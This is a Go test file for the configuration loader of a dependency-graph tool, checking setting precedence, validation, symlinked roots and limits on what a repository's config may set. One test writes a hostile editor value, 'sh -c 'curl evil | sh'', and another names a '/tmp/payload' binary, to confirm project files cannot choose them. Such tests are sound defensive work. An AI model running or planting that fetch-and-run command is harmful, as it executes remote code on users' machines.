package config

import (
	"io"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/spf13/pflag"
)

// resolve is what Load makes of a path: it follows symlinks and expands short names,
// so a temporary directory comes back as /private/var/... on macOS and with the long
// user name on Windows.
func resolve(t *testing.T, p string) string {
	t.Helper()
	r, err := filepath.EvalSymlinks(p)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

// load parses args like the command does and loads the configuration; env is set
// for the duration of the test.
func load(t *testing.T, args []string, env map[string]string, userDir string) (Config, error) {
	t.Helper()
	for k, v := range env {
		t.Setenv(k, v)
	}
	fs := pflag.NewFlagSet("depphunter", pflag.ContinueOnError)
	fs.SetOutput(io.Discard)
	RegisterFlags(fs)
	if err := fs.Parse(args); err != nil {
		return Config{}, err
	}
	return Load(fs, fs.Args(), userDir)
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestPrecedence(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "addr: 127.0.0.1:1\nui:\n  theme: dark\n  color_by: size\n  height_scale: log\n")
	write(t, filepath.Join(root, ProjectFile), "addr: 127.0.0.1:2\nui:\n  theme: light\n")
	env := map[string]string{"DEPPHUNTER_ADDR": "127.0.0.1:3", "DEPPHUNTER_EXCLUDE": "*.gen.go"}

	cfg, err := load(t, []string{"--height-scale", "linear", "--exclude", "testdata", root}, env, user)
	if err != nil {
		t.Fatal(err)
	}
	checks := []struct{ name, got, want string }{
		{"addr (env beats project and user)", cfg.Addr, "127.0.0.1:3"},
		{"theme (project beats user)", cfg.UI.Theme, "light"},
		{"color_by (user beats default)", cfg.UI.ColorBy, "size"},
		{"height_scale (flag beats user)", cfg.UI.HeightScale, "linear"},
		{"root", cfg.Root, resolve(t, root)},
	}
	for _, c := range checks {
		if c.got != c.want {
			t.Errorf("%s: got %q, want %q", c.name, c.got, c.want)
		}
	}
	if len(cfg.Exclude) != 2 || cfg.Exclude[0] != "*.gen.go" || cfg.Exclude[1] != "testdata" {
		t.Errorf("exclude: got %v", cfg.Exclude)
	}
}

func TestUnsetFlagsDoNotOverrideFiles(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "open: false\nui:\n  show_std: true\n  expand_depth: 3\n")
	cfg, err := load(t, []string{root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Open || !cfg.UI.ShowStd || cfg.UI.ExpandDepth != 3 {
		t.Errorf("file values lost: %+v", cfg)
	}
}

func TestExplicitConfigMustExist(t *testing.T) {
	_, err := load(t, []string{"--config", filepath.Join(t.TempDir(), "missing.yaml"), t.TempDir()}, nil, "")
	if err == nil {
		t.Fatal("expected an error for a missing --config file")
	}
}

func TestValidation(t *testing.T) {
	_, err := load(t, []string{"--theme", "neon", t.TempDir()}, nil, "")
	if err == nil {
		t.Fatal("expected invalid theme to be rejected")
	}
}

func TestWatchCacheEditorAndExport(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "watch: true\n")
	env := map[string]string{"DEPPHUNTER_CACHE": "false", "DEPPHUNTER_EDITOR": "subl {file}:{line}"}
	cfg, err := load(t, []string{"--export", "dot", "-o", "g.dot", root}, env, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Watch || cfg.Cache || cfg.Editor != "subl {file}:{line}" || cfg.Export != "dot" || cfg.Output != "g.dot" {
		t.Errorf("unexpected config: %+v", cfg)
	}
	if _, err := load(t, []string{"--export", "svg", root}, nil, ""); err == nil {
		t.Error("unknown export format accepted")
	}
	if _, err := load(t, []string{"-o", "x", root}, nil, ""); err == nil {
		t.Error("-o without --export accepted")
	}
}

func TestProjectConfigCannotChooseEditor(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "editor: code -g {file}:{line}\n")
	write(t, filepath.Join(root, ProjectFile), "editor: sh -c 'curl evil | sh' {file}\n")
	cfg, err := load(t, []string{root}, nil, user)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Editor != "code -g {file}:{line}" {
		t.Errorf("project config set editor to %q", cfg.Editor)
	}
}

func TestProjectConfigCannotChooseTerminalBrowser(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "terminal_browser: /usr/bin/chromium\n")
	write(t, filepath.Join(root, ProjectFile), "terminal: true\nterminal_browser: /tmp/payload\n")
	cfg, err := load(t, []string{root}, nil, user)
	if err != nil {
		t.Fatal(err)
	}
	// The repository may ask for the terminal view, but not name the binary it runs.
	if !cfg.Terminal {
		t.Error("project config did not enable the terminal view")
	}
	if cfg.TerminalBrowser != "/usr/bin/chromium" {
		t.Errorf("project config set terminal_browser to %q", cfg.TerminalBrowser)
	}
}

func TestTerminalSettings(t *testing.T) {
	root := t.TempDir()
	cfg, err := load(t, []string{"--terminal", "--terminal-graphics", "sixel", root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Terminal || cfg.TerminalGraphics != "sixel" {
		t.Errorf("unexpected config: %+v", cfg)
	}
	if cfg, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_TERMINAL": "true"}, ""); err != nil {
		t.Fatal(err)
	}
	if !cfg.Terminal || cfg.TerminalGraphics != "auto" {
		t.Errorf("unexpected config: %+v", cfg)
	}
	if _, err := load(t, []string{"--terminal-graphics", "ascii", root}, nil, ""); err == nil {
		t.Error("unknown graphics protocol accepted")
	}
}

func TestHistorySettings(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "history_commits: 500\nui:\n  color_by: churn\n")
	cfg, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_HISTORY": "false"}, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.History || cfg.HistoryCommits != 500 || cfg.UI.ColorBy != "churn" {
		t.Errorf("unexpected config: %+v", cfg)
	}
	if _, err := load(t, []string{"--history-commits", "0", root}, nil, ""); err == nil {
		t.Error("history-commits 0 accepted")
	}
}

func TestLSPSettings(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "lsp: true\n"+"lsp_timeout: 90s\n")
	cfg, err := load(t, []string{root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.LSP || cfg.LSPTimeout != 90*time.Second {
		t.Errorf("unexpected config: lsp %v timeout %v", cfg.LSP, cfg.LSPTimeout)
	}
}

func TestNegatedFlagsAndNewEnv(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "open: true\nhistory_commits: 50\n")
	env := map[string]string{"DEPPHUNTER_HISTORY_COMMITS": "70", "DEPPHUNTER_LSP_TIMEOUT": "2m", "DEPPHUNTER_EXPAND_DEPTH": "-1"}
	cfg, err := load(t, []string{"--no-open", "--no-cache", root}, env, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Open || cfg.Cache || !cfg.History {
		t.Errorf("--no-* flags: open %v cache %v history %v", cfg.Open, cfg.Cache, cfg.History)
	}
	if cfg.HistoryCommits != 70 || cfg.LSPTimeout != 2*time.Minute || cfg.UI.ExpandDepth != -1 {
		t.Errorf("env: history_commits %d lsp_timeout %v expand_depth %d", cfg.HistoryCommits, cfg.LSPTimeout, cfg.UI.ExpandDepth)
	}
	if _, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_OPEN": "maybe"}, ""); err == nil {
		t.Error("invalid boolean in the environment accepted")
	}
}

func TestSymlinkedRootAndPaths(t *testing.T) {
	dir := t.TempDir()
	link := filepath.Join(t.TempDir(), "link")
	if err := os.Symlink(dir, link); err != nil {
		t.Skip("symlinks unavailable:", err)
	}
	cfg, err := load(t, []string{link}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	want := resolve(t, dir)
	if cfg.Root != want || cfg.ConfigFile != filepath.Join(want, ProjectFile) {
		t.Errorf("root %q config %q, want %q", cfg.Root, cfg.ConfigFile, want)
	}
	if _, err := load(t, []string{dir, dir}, nil, ""); err == nil {
		t.Error("two paths accepted")
	}
}

// TestEveryFlagIsBound catches the mistake of registering a flag and forgetting to
// give it a setting: the flag then parses, prints in --help, and changes nothing.
func TestEveryFlagIsBound(t *testing.T) {
	// The flags that act on their own instead of setting a value.
	standalone := map[string]bool{
		"config": true, "export": true, "output": true, "exclude": true,
		"help": true, "version": true,
	}
	fs := pflag.NewFlagSet("test", pflag.ContinueOnError)
	RegisterFlags(fs)
	fs.VisitAll(func(f *pflag.Flag) {
		if standalone[f.Name] {
			return
		}
		if _, ok := flagKeys[f.Name]; ok {
			return
		}
		if _, ok := negatedFlags[f.Name]; ok {
			return
		}
		t.Errorf("--%s is registered but bound to no setting", f.Name)
	})
}

func TestOnlineSettings(t *testing.T) {
	root := t.TempDir()
	cfg, err := load(t, []string{"--online", root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Online {
		t.Error("--online did not reach the configuration")
	}
	// A repository does not get to decide that this machine goes on the network.
	write(t, filepath.Join(root, ProjectFile), "online: true\nresolve_depth: 2\n")
	if cfg, err = load(t, []string{root}, nil, ""); err != nil {
		t.Fatal(err)
	}
	if cfg.Online {
		t.Error("the project config turned on network access")
	}
	if cfg.ResolveDepth != 2 {
		t.Errorf("resolve_depth from the project config is %d", cfg.ResolveDepth)
	}
}
